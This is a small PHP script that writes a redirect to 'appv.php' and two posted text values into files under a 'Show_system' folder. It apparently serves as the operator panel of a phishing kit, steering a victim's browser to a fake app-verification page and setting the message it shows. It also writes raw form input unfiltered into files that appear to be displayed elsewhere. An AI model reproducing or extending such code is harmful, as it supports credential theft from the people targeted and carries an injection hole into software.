<?php


session_start();

if(isset($_POST['Appviverify'])) 
{
    
$Page .= ' <meta http-equiv="refresh" content="0;url=./appv.php" /> ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



$textimage = $_SESSION['textAppviverify'] = $_POST['textAppviverify'];

$yagmai .= ''.$textimage.'';
                      
$f = fopen("../Show_system/Show_Appvverify.txt", "w");
    fwrite($f, $yagmai);


$textbeneff = $_SESSION['textMont'] = $_POST['textMont'];

$yabenef .= ''.$textbeneff.'';
                      
$b = fopen("../Show_system/Show_AppMont.txt", "w");
    fwrite($b, $yabenef);


}

else {




}

?>

